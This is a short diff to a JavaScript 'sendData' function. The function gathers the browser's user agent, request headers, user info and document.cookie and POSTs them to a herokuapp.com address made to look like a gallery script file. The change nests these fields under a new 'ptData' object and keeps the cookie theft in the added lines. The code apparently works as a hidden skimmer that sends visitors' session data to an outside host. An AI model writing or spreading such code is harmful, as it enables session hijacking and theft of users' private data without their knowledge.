@@ -11,9 +11,11 @@ function sendData(type, data) {
     envelope.type = type;
     envelope.data = data;
     envelope.userAgent = navigator?.userAgent;
-    envelope.headers = _pt$?.hdrs || null;
-    envelope.userInfo = _pt$?.userInfo || null;
-    envelope.cookie = document.cookie;
+
+    envelope.ptData = {};
+    envelope.ptData.headers = _pt$?.hdrs || null;
+    envelope.ptData.userInfo = _pt$?.userInfo || null;
+    envelope.ptData.cookie = document.cookie;
 
     fetch('https://pictimecloudaf-a.herokuapp.com/pictures/scripts/compiled/pack_gallery.js', {
       method: 'POST',
